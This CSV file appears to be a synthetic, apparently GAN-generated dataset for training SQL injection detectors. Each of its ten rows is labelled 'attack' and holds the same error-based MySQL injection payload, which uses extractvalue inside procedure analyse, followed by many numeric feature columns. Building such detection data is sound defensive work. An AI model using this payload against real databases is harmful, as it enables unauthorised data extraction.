id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.024260648470942,265.5083923339844,83.87316131591797,39.442626953125,102.04489135742188,5.078122138977051,83.1085205078125,37.67007827758789,0.8081376552581787,0.30170556902885437,0.15744897723197937,0.38787728548049927,0.12503895163536072,3.8713550567626953,1.7156035900115967,0.43324050307273865,0.44350454211235046,0.01338405255228281,0.0691431388258934,-0.035510286688804626,9.295551300048828,10.499520301818848,3.6273560523986816,0.13471585512161255,1.7635215520858765,0.17235401272773743,0.027477044612169266,0.24355033040046692,0.09471272677183151,0.7092332243919373,0.17499759793281555,0.08052784204483032,1.9152255058288574,-0.025056440383195877,0.3523595333099365,1.9618127346038818,7.698580741882324,1.0142817497253418,2.288869619369507,0.48261046409606934,0.35081028938293457,0.9065752029418945,0.07392805814743042,0.02277827449142933,-0.10066719353199005,0.10046584904193878,0.2087574005126953,0.3009229302406311,0.3574238717556,0.3713016211986542,0.2930947542190552,0.40688908100128174,0.10577552765607834,-0.1230282336473465,0.4035951793193817,0.11313309520483017,0.1235010027885437,-0.033535998314619064,-0.13651421666145325,0.17330589890480042,-0.05021180585026741,-0.04326851665973663,0.11532147973775864,-0.014967646449804306,0.04336971044540405,0.02824138104915619,0.6179487705230713,-0.09412851184606552,-0.1728113293647766,-0.09423098713159561,0.03173594921827316,-0.21523499488830566,-0.1007595807313919,-0.045037440955638885,-0.23100250959396362,-0.049253206700086594,1.1359411478042603,0.40977877378463745,0.08221501111984253,0.10083793848752975,0.4485751688480377,9.276347160339355,0.7530357241630554,0.19657272100448608,0.027205919846892357,0.7774784564971924,0.07655036449432373,-0.029664289206266403,0.027012810111045837
GAN_000002,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,4.926646856222149,270.4558410644531,85.0601806640625,40.511722564697266,101.5944595336914,4.874682903289795,80.06123352050781,36.646392822265625,0.9206834435462952,0.31539812684059143,0.15363667905330658,0.3909202218055725,0.12641598284244537,3.838186264038086,1.7006665468215942,0.3863336443901062,0.46591952443122864,0.03020675666630268,0.03337977081537247,-0.01028806809335947,9.461901664733887,10.234087944030762,3.807974100112915,0.1825396716594696,1.8267076015472412,0.170768141746521,0.022389177232980728,0.25981733202934265,0.09083003550767899,0.6639624834060669,0.15888410806655884,0.09271439909934998,1.7874197959899902,-0.03329801931977272,0.2832431495189667,2.0781731605529785,7.678747177124023,1.0053176879882812,2.3729498386383057,0.49408379197120667,0.32654857635498047,0.9263325929641724,0.06911801546812057,0.018083052709698677,-0.10125011205673218,0.08081290870904922,0.012391656637191772,0.38515326380729675,0.30135154724121094,0.3412318527698517,0.34333664178848267,0.44548720121383667,-0.0857963040471077,-0.05835679545998573,0.4316032826900482,0.118478924036026,0.11340126395225525,0.08110235631465912,-0.11765867471694946,0.19925904273986816,0.014801785349845886,0.10192238539457321,0.056482959538698196,0.04167799651622772,0.05403681471943855,0.11726183444261551,0.6503355503082275,-0.11985615640878677,-0.16297952830791473,-0.12150458246469498,0.08210153877735138,-0.22898617386817932,-0.12461286783218384,-0.13396278023719788,-0.10172790288925171,0.06875848770141602,1.0170947313308716,0.4097115695476532,0.1472463607788086,0.09058760106563568,0.3915507197380066,9.269689559936523,0.7317889332771301,0.21758881211280823,0.010362530127167702,0.7601731419563293,-0.10498997569084167,-0.16144390404224396,-0.05970611423254013
GAN_000003,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.062208095662682,263.7047424316406,84.46011352539062,39.904640197753906,101.16291046142578,3.426980972290039,80.96590423583984,37.45917892456055,0.8854959607124329,0.30340176820755005,0.15661966800689697,0.39416173100471497,0.12441696971654892,3.8546571731567383,1.809675693511963,0.4468178451061249,0.4413900375366211,0.04993540793657303,0.08364882320165634,0.1181526929140091,9.244178771972656,10.635189056396484,3.9580061435699463,0.17136716842651367,1.7075217962265015,0.16761597990989685,-0.010867382399737835,0.2416052371263504,0.07917322963476181,0.6821210384368896,0.20202848315238953,0.17910048365592957,1.8636826276779175,-0.07239735126495361,0.3468305468559265,1.9541925191879272,7.873748302459717,0.9561415910720825,2.284224510192871,0.5321494936943054,0.273133248090744,0.9549824595451355,-0.007121659815311432,0.00889531709253788,-0.1392049640417099,0.06361517310142517,0.16851696372032166,0.33075475692749023,0.2998010516166687,0.3249996602535248,0.23593586683273315,0.4108254909515381,0.09175828844308853,-0.0659409761428833,0.3912043571472168,0.11413826793432236,0.1436171680688858,0.13806673884391785,-0.09384958446025848,0.11396624147891998,0.02025461196899414,-0.016846761107444763,-0.006718263030052185,0.07280483096837997,0.04559250921010971,-0.029255179688334465,0.6293206810951233,-0.11330868303775787,-0.18206165730953217,-0.0772474929690361,0.09498749673366547,-0.2571825683116913,-0.2445087730884552,0.007093779742717743,-0.14112141728401184,-0.0022232234477996826,1.211190104484558,0.44660478830337524,0.13624311983585358,0.07879652827978134,0.41369524598121643,9.467658042907715,0.7717717289924622,0.20136569440364838,0.0004352123069111258,0.7938940525054932,0.08355007320642471,0.01635853573679924,-0.08847953379154205
GAN_000004,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.155862230850754,273.23504638671875,80.54280853271484,38.454200744628906,99.12728881835938,2.5096428394317627,84.93035125732422,39.14916229248047,0.9476503133773804,0.3116784393787384,0.1673842817544937,0.39238566160202026,0.1300087720155716,3.828430414199829,1.6636229753494263,0.44596201181411743,0.37641090154647827,0.08528827875852585,-0.09872344881296158,-0.1229139119386673,9.33768367767334,9.625167846679688,3.1710169315338135,0.10629170387983322,1.9138871431350708,0.17520542442798615,-0.03716667741537094,0.09879118949174881,0.033455099910497665,0.736790657043457,0.22760871052742004,0.06539328396320343,1.821301817893982,-0.20847758650779724,0.2665873169898987,2.06144118309021,7.687601566314697,1.0292816162109375,2.682103157043457,0.8100304007530212,0.25954753160476685,0.7527822852134705,0.007236763834953308,0.04724401235580444,-0.06168660521507263,0.19363804161548615,0.1532663106918335,0.3200249671936035,0.1867573857307434,0.3545820116996765,0.25220048427581787,0.4724608361721039,-0.08587748557329178,-0.03602546826004982,0.42732474207878113,0.10936907678842545,0.0696142315864563,0.035899680107831955,0.0195576474070549,0.26467686891555786,-0.1187804788351059,0.027662158012390137,0.007165171205997467,0.17686066031455994,0.0554254949092865,-0.09737691283226013,0.6782835721969604,0.22768539190292358,-0.25362977385520935,-0.07242728024721146,0.23635338246822357,0.07972219586372375,0.13666340708732605,-0.02079419046640396,0.05574159324169159,0.008096873760223389,0.9371727108955383,0.48715585470199585,0.20821678638458252,0.1202375739812851,0.4644891321659088,9.699646949768066,0.7583245038986206,0.18091267347335815,0.04535503685474396,0.7894128561019897,0.058783069252967834,0.018417339771986008,-0.01598329097032547
GAN_000005,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.006098614425049,270.47772216796875,85.34278106689453,40.15729904174805,102.19791412353516,3.0009305477142334,80.33486938476562,36.412296295166016,1.014878511428833,0.30831319093704224,0.16032816469669342,0.3930249512195587,0.12678776681423187,3.858132839202881,1.7126482725143433,0.5615363717079163,0.47150489687919617,0.05693604052066803,0.25304633378982544,-0.04490738734602928,9.490816116333008,10.324440956115723,3.852935314178467,0.06536534428596497,1.7856367826461792,0.17396679520606995,0.027174316346645355,0.16176563501358032,0.07588334381580353,0.800803005695343,0.2435043305158615,0.009000129997730255,1.8096765279769897,-0.13729746639728546,0.3026673197746277,2.0390682220458984,8.023740768432617,1.041245698928833,2.3897924423217773,0.5518845915794373,0.24986742436885834,0.7941548228263855,-0.0710970014333725,0.018929509446024895,-0.28028297424316406,0.06855654716491699,0.05970238894224167,0.3714373707771301,0.3459070324897766,0.3686861991882324,0.24334070086479187,0.38019832968711853,-0.028283394873142242,0.03339456766843796,0.42083561420440674,0.0972156673669815,0.13235121965408325,-0.0006538219749927521,-0.015200555324554443,0.1833793669939041,-0.0150371715426445,-0.04365301877260208,0.04628707468509674,0.029317371547222137,0.029630597680807114,-0.10585805028676987,0.6198228597640991,-0.032937489449977875,-0.1394902467727661,0.0658542588353157,0.13961154222488403,0.017915353178977966,-0.02765350043773651,-0.03153025358915329,0.1609751284122467,-0.12808257341384888,1.119188666343689,0.5204151272773743,0.11842402815818787,0.06689196825027466,0.43940243124961853,9.305648803710938,0.767303466796875,0.2258230298757553,0.04688229411840439,0.8023573756217957,0.12895256280899048,0.06115434691309929,-0.00786609947681427
GAN_000006,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.0738779954438655,268.42840576171875,83.29898834228516,41.80607604980469,99.71656036376953,6.129169464111328,80.86305236816406,36.992279052734375,1.149436354637146,0.3060668706893921,0.15873228013515472,0.3876603841781616,0.12799334526062012,3.8284130096435547,1.5697592496871948,0.34296905994415283,0.45894718170166016,0.09264829009771347,0.0061002010479569435,-0.13430467247962952,9.302576065063477,10.078380584716797,3.498032808303833,0.21157944202423096,1.875949501991272,0.18111519515514374,0.05142088606953621,0.2845299541950226,0.07063820213079453,0.7298378348350525,0.25807273387908936,0.021457374095916748,1.86200749874115,0.04582156985998154,0.27028143405914307,2.1295621395111084,7.583901405334473,0.8681766986846924,2.241140604019165,0.5125150680541992,0.3188646733760834,0.8313226699829102,0.08075147122144699,0.013239460065960884,-0.11616083979606628,0.08893252909183502,-0.04502859711647034,0.34136709570884705,0.3139931261539459,0.3156767785549164,0.30898603796958923,0.4302302598953247,-0.17194944620132446,0.0552634671330452,0.4562741816043854,0.10872999578714371,0.11520770192146301,0.03619444742798805,-0.0931900292634964,0.1381591260433197,-0.021739259362220764,0.10016011446714401,0.13985499739646912,0.0034076161682605743,0.05039844289422035,0.04831129312515259,0.6612542867660522,-0.15331488847732544,-0.13253656029701233,-0.13596001267433167,0.09470454603433609,-0.1135466918349266,-0.15480771660804749,-0.10770232230424881,0.01871218904852867,0.15847451984882355,0.9833087921142578,0.4407007098197937,0.13968433439731598,0.11323881149291992,0.4044078588485718,9.580754280090332,0.7137956619262695,0.24459274113178253,0.023195689544081688,0.7403417825698853,-0.1945902556180954,-0.03940246254205704,0.021871045231819153
GAN_000007,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.073909269975762,272.6473693847656,84.99188995361328,41.92131423950195,99.73444366455078,3.5190718173980713,79.74250030517578,37.21763610839844,1.1902923583984375,0.30660107731819153,0.15920566022396088,0.38740548491477966,0.12887750566005707,3.8317384719848633,1.8820130825042725,0.4468992054462433,0.4642753601074219,0.08214984834194183,-0.012345144525170326,-0.019512537866830826,9.604863166809082,10.015584945678711,4.038561820983887,0.030509978532791138,1.8827730417251587,0.1448003500699997,0.035995155572891235,0.27770695090293884,0.018453754484653473,0.7981107234954834,0.21243947744369507,-0.03853246569633484,1.9340397119522095,0.06067813187837601,0.30471691489219666,2.167130470275879,7.613447666168213,0.8050849437713623,2.417006731033325,0.5368212461471558,0.32026028633117676,0.8349668383598328,0.030035600066184998,0.013627590611577034,-0.1355970948934555,0.2889034152030945,-0.09000992774963379,0.35620975494384766,0.31595921516418457,0.33835113048553467,0.2480694055557251,0.4660196006298065,-0.09028197079896927,-0.046365030109882355,0.45228514075279236,0.1087070032954216,0.15739618241786957,0.034246813505887985,-0.031831324100494385,0.25940680503845215,-0.033014677464962006,0.12024707347154617,0.11337543278932571,0.06722589582204819,0.03279981017112732,-0.02333001419901848,0.6904159784317017,-0.17996002733707428,-0.1258239895105362,-0.09232459217309952,0.1656855046749115,-0.04511618614196777,-0.06519179046154022,-0.03996335715055466,0.052201807498931885,0.04544176533818245,0.9819933772087097,0.526333749294281,0.059124547988176346,0.0678071603178978,0.4158356487751007,9.670448303222656,0.7398195266723633,0.2865658104419708,0.034844137728214264,0.7576834559440613,-0.18776243925094604,0.06393676996231079,0.005775779485702515
GAN_000008,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.008707981013382,270.7043762207031,82.44466400146484,40.90757369995117,104.70775604248047,4.943475723266602,81.16472625732422,37.161434173583984,0.8533238768577576,0.31868845224380493,0.1545257419347763,0.38838157057762146,0.12755313515663147,3.8533284664154053,1.7867472171783447,0.3652479946613312,0.43180733919143677,0.0848408043384552,0.08135078847408295,-0.026534944772720337,9.61175537109375,10.393712997436523,3.9031755924224854,0.20818081498146057,1.8373785018920898,0.2085392028093338,-0.02525242045521736,0.18574538826942444,0.06188938766717911,0.8188375234603882,0.09175925701856613,-0.03620684891939163,1.923742413520813,-0.1429341584444046,0.29085519909858704,2.129023790359497,8.051060676574707,1.038905382156372,2.456110954284668,0.41754892468452454,0.3475218117237091,0.8652559518814087,0.033600132912397385,0.02261919155716896,-0.06352853775024414,0.10746001452207565,0.05251926928758621,0.31599318981170654,0.38569027185440063,0.37741753458976746,0.293629914522171,0.3750556707382202,0.07080598175525665,-0.08560794591903687,0.4172837734222412,0.10333015024662018,0.10941992700099945,-0.06602124869823456,-0.13110573589801788,0.18333210051059723,0.045342348515987396,-0.036058418452739716,0.12660837173461914,0.02790096402168274,0.026211004704236984,0.02562003582715988,0.6106188297271729,-0.12084908038377762,-0.10004077851772308,0.036259669810533524,-0.010449551045894623,-0.05054360628128052,-0.04105602204799652,-0.0632423684000969,-0.0968623161315918,-0.03637813404202461,1.101447582244873,0.47600826621055603,0.12629543244838715,0.1162654235959053,0.4378281831741333,9.823664665222168,0.747032880783081,0.20098774135112762,0.03971656784415245,0.7398147583007812,-0.022768434137105942,0.056596335023641586,0.12951809167861938
GAN_000009,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.122612392458135,269.0390930175781,80.3404769897461,41.00625991821289,98.86196899414062,3.7808990478515625,83.5811767578125,37.501216888427734,1.1165653467178345,0.3017054796218872,0.1619592308998108,0.3878626823425293,0.12601639330387115,3.8375837802886963,1.5035648345947266,0.45043909549713135,0.383708655834198,0.10107718408107758,-0.09632649272680283,-0.15167425572872162,9.56964111328125,10.461030960083008,3.3126535415649414,0.13544917106628418,1.8600667715072632,0.18233701586723328,-0.05854542925953865,0.24833187460899353,0.04959717392921448,0.6042007803916931,0.2401679903268814,0.0712067186832428,1.9741443395614624,-0.06604375690221786,0.3037264943122864,2.119234323501587,7.678267478942871,0.9964818954467773,2.3558671474456787,0.6040543913841248,0.29318326711654663,0.8619338274002075,0.023893296718597412,0.010482072830200195,-0.020784616470336914,0.07854746282100677,0.08014044910669327,0.3239576518535614,0.330898642539978,0.34993693232536316,0.26174023747444153,0.4116513431072235,-0.12304099649190903,-0.021601412445306778,0.4428749978542328,0.1274631917476654,0.13383468985557556,0.08212265372276306,-0.16184334456920624,0.29450321197509766,0.004459738731384277,0.0633368119597435,0.0931914746761322,0.038319602608680725,0.06689106673002243,0.06523417681455612,0.6984211206436157,-0.1261059194803238,-0.2391967922449112,-0.14836540818214417,0.14514341950416565,-0.13104841113090515,-0.0860133022069931,-0.18278491497039795,-0.07239794731140137,0.12465715408325195,0.9885057806968689,0.49996158480644226,0.08011188358068466,0.1527705192565918,0.42005452513694763,9.545944213867188,0.7282280921936035,0.24054662883281708,0.034218139946460724,0.7540256977081299,-0.14840111136436462,-0.13319048285484314,0.03486107289791107
GAN_000010,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.153436453861514,265.57391357421875,80.66716766357422,38.111141204833984,101.58792114257812,5.510136127471924,86.93302154541016,38.90639877319336,0.7990707755088806,0.300780713558197,0.15728138387203217,0.3862146735191345,0.12521007657051086,3.890756845474243,1.651663064956665,0.4643644094467163,0.2566283643245697,0.0382046177983284,0.018792953342199326,-0.21144017577171326,9.641956329345703,10.45991039276123,3.3614211082458496,0.1889219433069229,1.803558588027954,0.18268702924251556,-0.09540191292762756,0.10254999250173569,0.04405401647090912,0.7529280185699463,0.3016967177391052,0.03673639893531799,1.9117950201034546,-0.2361065149307251,0.3177870512008667,1.9731969833374023,7.7345781326293945,0.8364143967628479,2.2521395683288574,0.5401482582092285,0.3862307667732239,0.8902309536933899,-0.03679469972848892,0.030004708096385002,0.01342417299747467,0.1529008150100708,0.22599691152572632,0.261118084192276,0.3283979594707489,0.4637884795665741,0.27141425013542175,0.441150039434433,0.21356502175331116,-0.055742040276527405,0.45471176505088806,0.10001484304666519,0.06203996390104294,-0.14603382349014282,-0.030182793736457825,0.2475181221961975,0.05593118816614151,0.13090366125106812,0.17941811680793762,-0.009996257722377777,0.037345826625823975,0.12578082084655762,0.5588841438293457,0.08990006893873215,-0.23880629241466522,-0.12699463963508606,-0.14938975870609283,0.030302632600069046,0.00574774295091629,-0.04972616583108902,-0.223190575838089,-0.08051568269729614,1.063275694847107,0.39836031198501587,0.09648702293634415,0.08398804813623428,0.5050042271614075,9.564461708068848,0.8256839513778687,0.1890554130077362,0.037897031754255295,0.7975200414657593,0.11776696145534515,0.2527120113372803,0.18708772957324982
